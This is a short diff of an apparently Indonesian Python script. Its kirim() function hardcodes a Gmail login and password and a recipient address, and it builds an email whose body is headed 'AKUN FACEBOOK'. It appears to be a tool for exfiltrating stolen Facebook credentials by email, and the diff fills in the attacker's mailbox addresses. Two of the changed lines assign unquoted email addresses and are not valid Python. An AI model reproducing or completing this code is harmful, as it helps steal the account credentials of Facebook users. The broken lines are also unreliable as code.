@@ -79,15 +79,15 @@ def inputM(x,d):
 			tampil('\rm[!]Pilihan tidak ada')
 	return i
 def kirim():
-   email_user = 'hekontoll.com'
+   email_user = 'hekontoll@gmail.com'
    email_password = 'percobaan'
-   email_send = 'hekontoll1.com'
+   email_send = 'hekontoll1@gmail.com'
 
    subject = '=== KIRIMAN NYA KAK ==='
 
    msg = MIMEMultipart()
-   msg['From'] = email_user
-   msg['To'] = email_send
+   msg['From'] = hekontoll@gmail.com
+   msg['To'] = hekontoll1@gmail.com
    msg['Subject'] = subject
 
    body = '====== AKUN FACEBOOK ======='
